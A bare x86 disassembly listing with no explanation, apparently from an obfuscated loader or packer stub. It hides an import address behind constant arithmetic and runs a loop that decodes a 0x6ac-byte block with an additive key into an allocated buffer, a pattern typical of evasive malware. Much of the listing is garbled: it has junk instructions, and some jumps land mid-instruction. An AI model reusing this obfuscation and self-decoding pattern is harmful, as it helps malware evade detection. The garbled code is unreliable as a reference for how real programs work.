  4d10c3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10c9:	sub    esp,0x60
  4d10cc:	mov    eax,0x4d3178
  4d10d1:	xor    edi,eax
  4d10d3:	push   eax
  4d10d4:	push   edi
  4d10d5:	push   DWORD PTR [eax+0x190]
  4d10db:	push   DWORD PTR [eax+0x94]
  4d10e1:	call   0x4d0a2c
  4d10e6:	add    esp,0xc
  4d10e9:	pop    eax
  4d10ea:	push   eax
  4d10eb:	lea    esi,[eax-0x178]
  4d10f1:	push   esi
  4d10f2:	call   0x4d15a0
  4d10f7:	add    esp,0x4
  4d10fa:	test   eax,eax
  4d10fc:	jne    0x4d10eb
  4d10fe:	pop    eax
  4d10ff:	push   eax
  4d1100:	mov    ecx,0x0
  4d1105:	push   ecx
  4d1106:	call   0x4d0d94
  4d110b:	add    esp,0x4
  4d110e:	pop    eax
  4d110f:	add    esp,0x60
  4d1112:	pop    ebp
  4d1113:	ret    
  4d1114:	pop    edi
  4d1115:	call   DWORD PTR ds:0x4d2010
  4d111b:	call   edi
  4d111d:	add    BYTE PTR [eax],al
  4d111f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1125:	sub    esp,0x1c
  4d1128:	mov    ecx,0x4d3144
  4d112d:	or     DWORD PTR [ecx-0xa8],eax
  4d1133:	push   ecx
  4d1134:	push   DWORD PTR [ecx+0x1c]
  4d1137:	push   DWORD PTR [ecx+0x16c]
  4d113d:	push   ebx
  4d113e:	call   0x4d0818
  4d1143:	add    esp,0xc
  4d1146:	pop    ecx
  4d1147:	push   ecx
  4d1148:	push   0x0
  4d114a:	call   0x4d0ca4
  4d114f:	add    esp,0x4
  4d1152:	pop    ecx
  4d1153:	push   ecx
  4d1154:	call   0x4d12d0
  4d1159:	add    esp,0x4
  4d115c:	pop    ecx
  4d115d:	add    esp,0x1c
  4d1160:	pop    ebp
  4d1161:	ret    
  4d1162:	add    BYTE PTR [eax],al
  4d1164:	mov    edi,edi
  4d1166:	push   ebp
  4d1167:	mov    ebp,esp
  4d1169:	sub    esp,0x58
  4d116c:	lea    ecx,ds:0x4d306c
  4d1172:	xor    eax,DWORD PTR [ebp-0x34]
  4d1175:	push   ecx
  4d1176:	push   edx
  4d1177:	push   DWORD PTR [ecx+0xc4]
  4d117d:	push   DWORD PTR [ecx+0xf0]
  4d1183:	push   DWORD PTR [ecx+0x118]
  4d1189:	call   0x4d14c0
  4d118e:	add    esp,0x10
  4d1191:	pop    ecx
  4d1192:	push   ecx
  4d1193:	mov    ecx,0x0
  4d1198:	push   ecx
  4d1199:	call   0x4d0b78
  4d119e:	add    esp,0x4
  4d11a1:	pop    ecx
  4d11a2:	push   ecx
  4d11a3:	push   0x0
  4d11a5:	call   0x4d1114
  4d11aa:	add    esp,0x4
  4d11ad:	pop    ecx
  4d11ae:	add    esp,0x58
  4d11b1:	pop    ebp
  4d11b2:	ret    
  4d11b3:	add    BYTE PTR [edi-0x1],bl
  4d11b6:	adc    eax,0x4d205c
  4d11bb:	call   edi
  4d11bd:	add    BYTE PTR [eax],al
  4d11bf:	add    BYTE PTR [edi-0x1],bl
  4d11c2:	adc    eax,0x4d201c
  4d11c7:	call   edi
  4d11c9:	add    BYTE PTR [eax],al
  4d11cb:	add    BYTE PTR [edi-0x1],bl
  4d11ce:	adc    eax,0x4d208c
  4d11d3:	call   edi
  4d11d5:	add    BYTE PTR [eax],al
  4d11d7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11dd:	sub    esp,0x44
  4d11e0:	lea    esi,ds:0x4d31e0
  4d11e6:	sub    DWORD PTR [esi-0x18],0x7261
  4d11ed:	lea    eax,[esi-0x1e0]
  4d11f3:	push   eax
  4d11f4:	call   0x4d15a0
  4d11f9:	add    esp,0x4
  4d11fc:	test   eax,eax
  4d11fe:	jne    0x4d11ee
  4d1200:	push   esi
  4d1201:	push   ecx
  4d1202:	push   edx
  4d1203:	push   DWORD PTR [esi+0x1c8]
  4d1209:	call   0x4d0c60
  4d120e:	add    esp,0xc
  4d1211:	pop    esi
  4d1212:	call   0x4d12d0
  4d1217:	add    esp,0x4
  4d121a:	add    esp,0x44
  4d121d:	pop    ebp
  4d121e:	ret    
  4d121f:	add    BYTE PTR [edi-0x1],bl
  4d1222:	adc    eax,0x4d2038
  4d1227:	call   edi
  4d1229:	add    BYTE PTR [eax],al
  4d122b:	add    BYTE PTR [edi-0x1],bl
  4d122e:	adc    eax,0x4d209c
  4d1233:	call   edi
  4d1235:	add    BYTE PTR [eax],al
  4d1237:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d123d:	sub    esp,0x50
  4d1240:	mov    edi,0x4d3070
  4d1245:	sub    esi,DWORD PTR [edi+0x14c]
  4d124b:	push   edi
  4d124c:	call   0x4d12d0
  4d1251:	add    esp,0x4
  4d1254:	pop    edi
  4d1255:	push   edi
  4d1256:	push   DWORD PTR [edi+0xf8]
  4d125c:	push   DWORD PTR [edi+0xf0]
  4d1262:	call   0x4d11d8
  4d1267:	add    esp,0x8
  4d126a:	pop    edi
  4d126b:	push   edi
  4d126c:	push   0x0
  4d126e:	call   0x4d1500
  4d1273:	add    esp,0x4
  4d1276:	pop    edi
  4d1277:	add    esp,0x50
  4d127a:	pop    ebp
  4d127b:	ret    
  4d127c:	mov    edi,edi
  4d127e:	push   ebp
  4d127f:	mov    ebp,esp
  4d1281:	sub    esp,0x30
  4d1284:	lea    edi,[esi-0x7c]
  4d1287:	or     DWORD PTR [ebp-0x24],0x2d
  4d128b:	push   edi
  4d128c:	push   DWORD PTR [edi+0x10c]
  4d1292:	push   DWORD PTR [edi+0x150]
  4d1298:	push   eax
  4d1299:	call   0x4d0774
  4d129e:	add    esp,0xc
  4d12a1:	pop    edi
  4d12a2:	push   edi
  4d12a3:	push   0x0
  4d12a5:	call   0x4d104c
  4d12aa:	add    esp,0x4
  4d12ad:	pop    edi
  4d12ae:	push   edi
  4d12af:	mov    edx,0x0
  4d12b4:	push   edx
  4d12b5:	call   0x4d0b78
  4d12ba:	add    esp,0x4
  4d12bd:	pop    edi
  4d12be:	add    esp,0x30
  4d12c1:	pop    ebp
  4d12c2:	ret    
  4d12c3:	add    BYTE PTR [edi-0x1],bl
  4d12c6:	adc    eax,0x4d2080
  4d12cb:	call   edi
  4d12cd:	add    BYTE PTR [eax],al
  4d12cf:	add    BYTE PTR [edi-0x1],bl
  4d12d2:	adc    eax,0x4d2000
  4d12d7:	call   edi
  4d12d9:	add    BYTE PTR [eax],al
  4d12db:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12e1:	sub    esp,0x54
  4d12e4:	lea    eax,[edi-0x104]
  4d12ea:	mov    edx,0x7c
  4d12ef:	push   eax
  4d12f0:	push   0x0
  4d12f2:	call   0x4d0d94
  4d12f7:	add    esp,0x4
  4d12fa:	pop    eax
  4d12fb:	push   eax
  4d12fc:	push   DWORD PTR [eax+0x54]
  4d12ff:	push   DWORD PTR [eax+0x34]
  4d1302:	push   DWORD PTR [eax+0x90]
  4d1308:	push   DWORD PTR [eax+0x1ac]
  4d130e:	call   0x4d0938
  4d1313:	add    esp,0x10
  4d1316:	pop    eax
  4d1317:	push   eax
  4d1318:	mov    edx,0x0
  4d131d:	push   edx
  4d131e:	call   0x4d0d94
  4d1323:	add    esp,0x4
  4d1326:	pop    eax
  4d1327:	add    esp,0x54
  4d132a:	pop    ebp
  4d132b:	ret    
  4d132c:	pop    edi
  4d132d:	call   DWORD PTR ds:0x4d2064
  4d1333:	call   edi
  4d1335:	add    BYTE PTR [eax],al
  4d1337:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d133d:	sub    esp,0x5c
  4d1340:	mov    edx,0x4d3048
  4d1345:	and    DWORD PTR [ebp-0x10],ecx
  4d1348:	push   edx
  4d1349:	push   0x0
  4d134b:	call   0x4d0ca4
  4d1350:	add    esp,0x4
  4d1353:	pop    edx
  4d1354:	push   edx
  4d1355:	push   ecx
  4d1356:	push   ebx
  4d1357:	push   ebx
  4d1358:	call   0x4d1008
  4d135d:	add    esp,0xc
  4d1360:	pop    edx
  4d1361:	push   edx
  4d1362:	mov    esi,0x0
  4d1367:	push   esi
  4d1368:	call   0x4d1114
  4d136d:	add    esp,0x4
  4d1370:	pop    edx
  4d1371:	add    esp,0x5c
  4d1374:	pop    ebp
  4d1375:	ret    
  4d1376:	add    BYTE PTR [eax],al
  4d1378:	mov    edi,edi
  4d137a:	push   ebp
  4d137b:	mov    ebp,esp
  4d137d:	sub    esp,0x3c
  4d1380:	lea    esi,[edi+0x80]
  4d1386:	mov    ecx,eax
  4d1388:	mov    eax,0x0
  4d138d:	push   eax
  4d138e:	call   0x4d0b78
  4d1393:	add    esp,0x4
  4d1396:	push   esi
  4d1397:	push   DWORD PTR [esi+0xb4]
  4d139d:	push   edi
  4d139e:	push   edi
  4d139f:	call   0x4d127c
  4d13a4:	add    esp,0xc
  4d13a7:	pop    esi
  4d13a8:	push   0x0
  4d13aa:	call   0x4d0a20
  4d13af:	add    esp,0x4
  4d13b2:	add    esp,0x3c
  4d13b5:	pop    ebp
  4d13b6:	ret    
  4d13b7:	add    BYTE PTR [edi-0x1],bl
  4d13ba:	adc    eax,0x4d2088
  4d13bf:	call   edi
  4d13c1:	add    BYTE PTR [eax],al
  4d13c3:	add    BYTE PTR [edi-0x1],bl
  4d13c6:	adc    eax,0x4d2060
  4d13cb:	call   edi
  4d13cd:	add    BYTE PTR [eax],al
  4d13cf:	add    BYTE PTR [edi-0x1],bl
  4d13d2:	adc    eax,0x4d2058
  4d13d7:	call   edi
  4d13d9:	add    BYTE PTR [eax],al
  4d13db:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13e1:	sub    esp,0x5c
  4d13e4:	sbb    eax,0xffff952b
  4d13e9:	lea    esi,[ecx-0x38]
  4d13ec:	push   0x6ac
  4d13f1:	mov    edi,0x6ac
  4d13f6:	push   edi
  4d13f7:	push   0x40001
  4d13fc:	mov    edx,0x862985b6
  4d1401:	push   DWORD PTR [edx+0x7a239a86]
  4d1407:	sub    DWORD PTR [esp],0x2
  4d140b:	mov    edx,0x4d202c
  4d1410:	pop    DWORD PTR [edx]
  4d1412:	call   0x4d0914
  4d1417:	add    esp,0x4
  4d141a:	push   eax
  4d141b:	pop    DWORD PTR [esi-0x1c]
  4d141e:	mov    ebx,DWORD PTR [esi-0x1c]
  4d1421:	lea    edi,[ebx]
  4d1423:	sub    ecx,ecx
  4d1425:	dec    ecx
  4d1426:	and    ecx,0x4d0014
  4d142c:	mov    eax,0xd5d9a824
  4d1431:	xor    ebx,ebx
  4d1433:	xor    edx,edx
  4d1435:	push   DWORD PTR [ecx+edx*1]
  4d1438:	add    DWORD PTR [esp],eax
  4d143b:	pop    DWORD PTR [edi+edx*2]
  4d143e:	dec    DWORD PTR [edi]
  4d1440:	xor    eax,eax
  4d1442:	add    eax,DWORD PTR [ecx]
  4d1444:	add    ecx,0x4
  4d1447:	add    edi,0x4
  4d144a:	add    ebx,0x4
  4d144d:	cmp    ebx,0x6ac
  4d1453:	jne    0x4d1433
  4d1455:	push   0xfffffff4
  4d1457:	call   0x4d085c
  4d145c:	add    esp,0x4
  4d145f:	add    esp,0x5c
  4d1462:	pop    ebp
  4d1463:	ret    
  4d1464:	pop    edi
  4d1465:	call   DWORD PTR ds:0x4d203c
  4d146b:	call   edi
  4d146d:	add    BYTE PTR [eax],al
  4d146f:	add    BYTE PTR [edi-0x1],bl
  4d1472:	adc    eax,0x4d2094
  4d1477:	call   edi
  4d1479:	add    BYTE PTR [eax],al
  4d147b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1481:	sub    esp,0x58
  4d1484:	lea    ebx,[ecx+0x1a0]
  4d148a:	xor    ecx,DWORD PTR [ebp-0x18]
  4d148d:	push   ebx
  4d148e:	push   DWORD PTR [ebx+0x1cc]
  4d1494:	push   eax
  4d1495:	call   0x4d0734
  4d149a:	add    esp,0x8
  4d149d:	pop    ebx
  4d149e:	lea    esi,[ebx-0x1a0]
  4d14a4:	push   esi
  4d14a5:	call   0x4d15a0
  4d14aa:	add    esp,0x4
  4d14ad:	test   eax,eax
  4d14af:	jne    0x4d149f
  4d14b1:	call   0x4d12d0
  4d14b6:	add    esp,0x4
  4d14b9:	add    esp,0x58
  4d14bc:	pop    ebp
  4d14bd:	ret    
  4d14be:	add    BYTE PTR [eax],al
  4d14c0:	mov    edi,edi
  4d14c2:	push   ebp
  4d14c3:	mov    ebp,esp
  4d14c5:	sub    esp,0x24
  4d14c8:	mov    edx,0x4d3170
  4d14cd:	cmp    edx,0x2249
  4d14d3:	je     0x4d14c3
  4d14d5:	push   edx
  4d14d6:	push   0x0
  4d14d8:	call   0x4d1114
  4d14dd:	add    esp,0x4
  4d14e0:	pop    edx
  4d14e1:	push   edx
  4d14e2:	push   esi
  4d14e3:	push   ecx
  4d14e4:	push   edi
  4d14e5:	call   0x4d0b18
  4d14ea:	add    esp,0xc
  4d14ed:	pop    edx
  4d14ee:	push   edx
  4d14ef:	push   0x0
  4d14f1:	call   0x4d0b78
  4d14f6:	add    esp,0x4
  4d14f9:	pop    edx
  4d14fa:	add    esp,0x24
  4d14fd:	pop    ebp
  4d14fe:	ret    
  4d14ff:	add    BYTE PTR [edi-0x1],bl
  4d1502:	adc    eax,0x4d2048
  4d1507:	call   edi
  4d1509:	add    BYTE PTR [eax],al
  4d150b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1511:	sub    esp,0x3c
  4d1514:	lea    ebx,ds:0x4d31f0
  4d151a:	and    ecx,0xffffd8c0
  4d1520:	push   ebx
  4d1521:	push   eax
  4d1522:	push   edi
  4d1523:	push   DWORD PTR [ebx+0x48]
  4d1526:	push   DWORD PTR [ebx+0x18c]
  4d152c:	call   0x4d09e0
  4d1531:	add    esp,0x10
  4d1534:	pop    ebx
  4d1535:	mov    esi,0x0
  4d153a:	push   esi
  4d153b:	call   0x4d1500
  4d1540:	add    esp,0x4
  4d1543:	mov    ecx,0x0
  4d1548:	push   ecx
  4d1549:	call   0x4d1500
  4d154e:	add    esp,0x4
  4d1551:	add    esp,0x3c
  4d1554:	pop    ebp
  4d1555:	ret    
  4d1556:	add    BYTE PTR [eax],al
  4d1558:	mov    edi,edi
  4d155a:	push   ebp
  4d155b:	mov    ebp,esp
  4d155d:	sub    esp,0x3c
  4d1560:	mov    ebx,0x4d30c4
  4d1565:	and    DWORD PTR [ebp-0x28],esi
  4d1568:	call   0x4d08b8
  4d156d:	add    esp,0x4
  4d1570:	push   ebx
  4d1571:	push   DWORD PTR [ebx+0x158]
  4d1577:	push   ecx
  4d1578:	push   DWORD PTR [ebx+0x24]
  4d157b:	push   edi
  4d157c:	call   0x4d0de8
  4d1581:	add    esp,0x10
  4d1584:	pop    ebx
  4d1585:	push   0x0
  4d1587:	call   0x4d104c
  4d158c:	add    esp,0x4
  4d158f:	add    esp,0x3c
  4d1592:	pop    ebp
  4d1593:	ret    
  4d1594:	pop    edi
  4d1595:	call   DWORD PTR ds:0x4d206c
  4d159b:	call   edi
  4d159d:	add    BYTE PTR [eax],al
  4d159f:	add    BYTE PTR [edi-0x1],bl
  4d15a2:	adc    eax,0x4d2040
  4d15a7:	call   edi
  4d15a9:	add    BYTE PTR [eax],al
  4d15ab:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d15b1:	sub    esp,0x60
  4d15b4:	mov    eax,0x4d3060
  4d15b9:	mov    esi,0xfffffff9
  4d15be:	push   eax
  4d15bf:	call   0x4d08b8
  4d15c4:	add    esp,0x4
  4d15c7:	pop    eax
  4d15c8:	push   eax
  4d15c9:	push   ecx
  4d15ca:	push   DWORD PTR [eax+0x58]
  4d15cd:	push   DWORD PTR [eax+0x1a8]
  4d15d3:	push   esi
  4d15d4:	call   0x4d1120
  4d15d9:	add    esp,0x10
  4d15dc:	pop    eax
  4d15dd:	push   eax
  4d15de:	push   0x0
  4d15e0:	call   0x4d1500
  4d15e5:	add    esp,0x4
  4d15e8:	pop    eax
  4d15e9:	add    esp,0x60
  4d15ec:	pop    ebp
  4d15ed:	ret    
	...
